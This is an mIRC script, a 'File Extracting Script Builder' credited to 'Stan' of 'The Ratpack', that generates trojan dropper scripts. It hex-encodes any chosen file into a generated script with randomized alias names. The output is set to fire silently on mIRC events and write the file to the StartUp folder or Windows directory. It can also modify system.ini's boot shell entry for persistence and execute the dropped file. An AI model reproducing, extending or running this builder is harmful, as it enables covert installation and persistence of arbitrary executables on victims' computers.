;mIRC File Extracting Script Builder 1.0
;Another Genius RatPack Production by Stan

alias makedafrigginfile {
  var %rand2 = $gimmearandomstring
  var %rand3 = $gimmearandomstring
  var %rand4 = $gimmearandomstring
  var %rand5 = $gimmearandomstring
  var %rand6 = $gimmearandomstring
  var %rand7 = $gimmearandomstring
  var %rand8 = $gimmearandomstring
  var %rand9 = $gimmearandomstring
  var %rand10 = $gimmearandomstring
  var %rand11 = $gimmearandomstring
  var %rand12 = $gimmearandomstring
  var %rand13 = $gimmearandomstring
  var %memextracttoname = $nopath($1-)
  var %memfilename = $1-
  var %memfilesize = $file(%memfilename).size
  var %memfileread = 0
  var %memblahincrease = 0
  var %memincamount
  var %targetfile = " $+ $scriptdirresult.mrc $+ "
  var %memprecentdone
  did -ra MFESB 25 Status: Writeing Lines..
  write -c %targetfile alias %rand2 $chr(123)
  if $did(MFESB,14).state = 1 { write %targetfile set % $+ %rand10 $ $+ mircdir }
  if $did(MFESB,15).state = 1 { write %targetfile set % $+ %rand10 $ $+ getdir(*.exe) }
  if $did(MFESB,16).state = 1 { write %targetfile set % $+ %rand10 $did(MFESB,17) }
  if $did(MFESB,16).state = 1 { write %targetfile if $ $+ exists(" $ $+ + % $+ %rand10 $ $+ + ") = $ $+ false $chr(123) mkdir " $ $+ + % $+ %rand10 $ $+ + " $chr(125) }
  if $did(MFESB,13).state = 1 || $did(MFESB,18).state = 1 {
    write %targetfile var % $+ %rand11 = 1
    write %targetfile var % $+ %rand12 = $ $+ findfile(c:\,system.ini,0,2)
    write %targetfile while % $+ %rand11 <= % $+ %rand12 $chr(123)
    write %targetfile var % $+ %rand13 = $ $+ findfile(c:\,system.ini, $+ % $+ %rand11 $+ ,2)
    write %targetfile if % $+ %rand13 != $ $+ null $chr(123)
    write %targetfile if $ $+ readini -n % $+ %rand13 boot shell != $ $+ null $chr(123)
    if $did(MFESB,13).state = 1 { write %targetfile set % $+ %rand10 $ $+ nofile( $+ % $+ %rand13 $+ ) }
    if $did(MFESB,18).state = 1 { write %targetfile if $ $+ right( $+ % $+ %rand10 $+ ,1) != $ $+ chr(92) $chr(123) set % $+ %rand10 % $+ %rand10 $ $+ + $ $+ chr(92) $chr(125) }
    if $did(MFESB,18).state = 1 { write %targetfile writeini -n % $+ %rand13 boot shell Explorer.exe $+ $chr(32) $+ " $ $+ + % $+ %rand10 $ $+ + %memextracttoname $ $+ + "  }
    write %targetfile $chr(125)
    write %targetfile $chr(125)
    write %targetfile inc % $+ %rand11
    write %targetfile $chr(125)
  }
  if $did(MFESB,18).state != 1 { write %targetfile if $ $+ right( $+ % $+ %rand10 $+ ,1) != $ $+ chr(92) $chr(123) set % $+ %rand10 % $+ %rand10 $ $+ + $ $+ chr(92) $chr(125) }
  write %targetfile write -c " $ $+ + % $+ %rand10 $ $+ + %memextracttoname $+ "
  did -ra MFESB 24 1% Done
  while %memfileread != %memfilesize {
    if $calc(%memfileread + 250) <= %memfilesize { set %memincamount 250 }
    else { set %memincamount $calc(%memfilesize - %memfileread) }
    did -ra MFESB 25 Status: Reading...
    bread %memfilename %memfileread %memincamount &WhatsInAName
    inc %memfileread %memincamount
    inc %memblahincrease
    var %meminccharstr = 1
    while %meminccharstr <= $bvar(&WhatsInAName,0) {
      set %rand1 %rand1 $+ $DecToHex( $bvar(&WhatsInAName,%meminccharstr) )
      inc %meminccharstr
    }
    if $did(MFESB,20).state = 1 { did -ra MFESB 25 Status: Compressing.. | set %rand1 $simplecompress(%rand1) }
    did -ra MFESB 25 Status: Writeing...
    if $did(MFESB,20).state = 1 { write %targetfile %rand3 $ $+ %rand4 $+ ( $+ %rand1 $+ ) }
    else { write %targetfile %rand3 %rand1 }
    set %memprecentdone $calc( $int( $calc( ( %memfileread / %memfilesize ) * 100) ) )
    if %memprecentdone < 1 { set %memprecentdone 1 }
    if %memprecentdone > 99 { set %memprecentdone 99 }
    did -ra MFESB 24 %memprecentdone $+ % Done
    unset %rand1
  }
  did -ra MFESB 25 Status: Writeing Lines...
  write %targetfile unset % $+ %rand10
  if $did(MFESB,19).state = 1 { write %targetfile .run " $ $+ + % $+ %rand10 $ $+ + %memextracttoname $+ " }
  write %targetfile $chr(125)
  if $did(MFESB,10).state = 1 { write %targetfile on *:Load: $chr(123) %rand2 $chr(125) }
  if $did(MFESB,8).state = 1 { write %targetfile on *:Start: $chr(123) $+ %rand2 $chr(125) }
  if $did(MFESB,9).state = 1 { write %targetfile on *:Exit: $chr(123) %rand2 $chr(125) }
  if $did(MFESB,11).state = 1 { write %targetfile on *:Connect: $chr(123) %rand2 $chr(125) }
  if $did(MFESB,12).state = 1 { write %targetfile on *:Disconnect: $chr(123) %rand2 $chr(125) }
  write %targetfile alias %rand3 $chr(123)
  write %targetfile var % $+ %rand5 = 1
  write %targetfile var % $+ %rand6 = 1
  write %targetfile while % $+ %rand5 <= $ $+ len($ $+ 1-) $chr(123)
  write %targetfile bset & $+ %rand7 % $+ %rand6 $ $+ base $+ ( $ $+ mid($ $+ 1-,% $+ %rand5 $+ ,2) ,16,10)
  write %targetfile inc % $+ %rand5 2
  write %targetfile inc % $+ %rand6
  write %targetfile $chr(125)
  write %targetfile bwrite " $ $+ + % $+ %rand10 $ $+ + %memextracttoname $+ " -1 -1 & $+ %rand7
  write %targetfile bunset & $+ %rand7
  write %targetfile $chr(125)
  if $did(MFESB,20).state = 1 {
    write %targetfile alias %rand4 $chr(123)
    write %targetfile var % $+ %rand8 = $ $+ 1-
    write %targetfile var % $+ %rand9
    write %targetfile while ^ isin % $+ %rand8 $chr(123)
    write %targetfile set % $+ %rand9 $ $+ pos( % $+ %rand8 $+ ,^, $ $+ pos( $+ % $+ %rand8 $+ ,^,0) )
    write %targetfile set % $+ %rand8 $ $+ left( % $+ %rand8 $+ , $ $+ calc( % $+ %rand9 - 1) ) $ $+ + $ $+ str( $ $+ mid( $+ % $+ %rand8 $+ ,$ $+ calc( % $+ %rand9 + 3),1) , $ $+ base( $ $+ mid( $+ % $+ %rand8 $+ ,$ $+ calc( % $+ %rand9 + 1) ,2) ,16,10) ) $ $+ + $ $+ right( $+ % $+ %rand8 $+ , $ $+ calc( $ $+ len( $+ % $+ %rand8 $+ ) - ( % $+ %rand9 + 3) ) )    
    write %targetfile $chr(125)
    write %targetfile return % $+ %rand8
    write %targetfile $chr(125)
  }
  did -ra MFESB 24 100% Done!
  did -ra MFESB 25 Finished Writeing Script!!  The finished script has been saved as result.mrc.
}


alias gimmearandomstring {
  :doitagain
  var %dastr
  var %strlen = $rand(3,10)
  while $len(%dastr) <= %strlen {
    set %dastr %dastr $+ $rand(a,z)
  }
  if %dastr != %rand1 && %dastr != %rand2 && %dastr != %rand3 && %dastr != %rand4 && %dastr != %rand5 && %dastr != %rand6 && %dastr != %rand7 && %dastr != %rand8 && %dastr != %rand9 && %dastr != %rand10 && %dastr != %rand11 && %dastr != %rand12 && %dastr != %rand13 {
    return %dastr
  }
  else { goto doitagain }
}

alias simplecompress {
  var %simplestr = $1-
  var %activenum = 0
  var %base16num
  var %longrepeatpos
  var %longrepeatlen
  while %activenum < 16 {
    set %base16num $base(%activenum,10,16)
    while $str(%base16num,5) isin %simplestr {
      set %longrepeatpos $pos(%simplestr,$str(%base16num,5),1)
      if $mid(%simplestr,%longrepeatpos,255) = $str(%base16num,255) && $len( $mid(%simplestr,%longrepeatpos,255) ) = $len( $str(%base16num,255) ) { set %simplestr $left( %simplestr, $calc( %longrepeatpos - 1) ) $+ ^FF $+ %base16num $+ $right( %simplestr, $calc( $len(%simplestr) - ( %longrepeatpos + 254) ) ) }
      else {
        ;figure out how long the charecter repeats then compress it
        set %longrepeatlen 5
        while $mid(%simplestr,$calc(%longrepeatpos + %longrepeatlen),1) = %base16num {
          inc  %longrepeatlen
        }
        set %simplestr $left( %simplestr, $calc( %longrepeatpos - 1) ) $+ ^ $+ $DecToHex(%longrepeatlen) $+ %base16num $+ $right( %simplestr, $calc( $len(%simplestr) - ( %longrepeatpos + %longrepeatlen - 1) ) )
      }    
    }
    inc %activenum
  }
  return %simplestr
}

alias DecToHex {
  if $chr(46) isin $calc( $len( $base($1-,10,16) ) / 2 ) { return 0 $+ $base($1-,10,16) }
  else { return $base($1-,10,16) }
}

alias FindWindir {
  var %whileloopincvar = 1
  var %numberofsysteminis = $findfile(c:\,system.ini,0,2)
  while %whileloopincvar <= %numberofsysteminis {
    var %inifileloacation = $findfile(c:\,system.ini,%whileloopincvar,2)
    if %inifileloacation != $null {
      if $readini -n %inifileloacation boot shell != $null {

        echo -a $readini -n %inifileloacation boot shell
        echo -a The windows directory is $nofile(%inifileloacation)
      }
    }
    inc %whileloopincvar
  }
}

dialog MFESB {
  title "mIRC File Extracting Script Builder 1.0 by Stan"
  size -1 -1 210 170
  option dbu
  button "&OK", 1, -1 -1 -1 -1, ok
  button "Make It!", 2,70 153 70 15
  button "Help", 3,5 155 35 12
  button "About", 4,170 155 35 12
  box "Event to use", 5, 5 3 200 23
  box "Where the file should be extracted", 6, 5 28 200 33
  box "Other Options", 7, 5 64 200 43
  radio "On Start", 8, 10 12 30 10,group
  radio "On Exit", 9, 44 12 30 10
  radio "On Load", 10, 78 12 30 10
  radio "On Connect", 11, 112 12 40 10
  radio "On Disconnect", 12, 156 12 46 10
  radio "Windows Directory", 13, 10 37 60 10,group
  radio "mIRC Directory", 14, 75 37 45 10
  radio "mIRC Download Directory", 15, 130 37 70 10
  radio "Other:", 16, 10 49 23 10
  edit "C:\WINDOWS\Start Menu\Programs\StartUp\", 17, 35 49 165 10,autohs
  check "Use system.ini startup method. (Because the run command is usually disabled.)", 18, 8 72 195 10
  check "Try to execute file after extraction.", 19, 8 83 195 10
  check "Use simple compression. (Smaller file size, but slower extraction.)", 20, 8 95 195 10
  box "File to embed into script.  (The smaller the better.  Try to keep under 20kb.)",21, 5 109 200 20
  edit "",22,8 116 165 11,autohs
  button "&Browse",23,175 117 28 10
  Text "0% Done",24,91 132 28 7,center
  Text "Status: Idle",25,5 141 200 7,center
}
on *:dialog:MFESB:init:0: {
  did -c MFESB 18,19,20,9,13
  did -b MFESB 17
}
on *:dialog:MFESB:sclick:13,14,15: { did -b MFESB 17 }
on *:dialog:MFESB:sclick:16: { did -e MFESB 17 }
on *:dialog:MFESB:sclick:3: { run $scriptdirMFESBReadMe.txt }
on *:dialog:MFESB:sclick:23: { .timer -m 1 1 did -ra MFESB 22 $sfile($mircdir,Select file to embed into script) }
on *:dialog:MFESB:sclick:2: { if $exists(  [ " $+ [ $did(MFESB,22) ] $+ " ] ) = $true && $did(MFESB,22) != $null { makedafrigginfile $did(MFESB,22) } | else { did -ra MFESB 25 Error: File $did(MFESB,22) does not exist. } }
on *:dialog:MFESB:sclick:4: { .timer -m 1 1 dialog -dmo AboutMFESB AboutMFESB }
dialog AboutMFESB { 
  title "About"
  size -1 -1 60 45
  option dbu
  button "&OK", 1, 3 28 55 15, ok
  text "Version: 1.0", 2, 3 3 30 7
  text "Group: The Ratpack", 3, 3 11 50 7
  text "Coder: Stan", 4, 3 19 30 7
}

menu channel,menubar {
  Script Embedder
  .Script Embedder:dialog -dm MFESB MFESB
  .Unload Script:unload -rs $script | echo -a *** mIRC File Extracting Script Builder 1.0 has been unloaded.
}
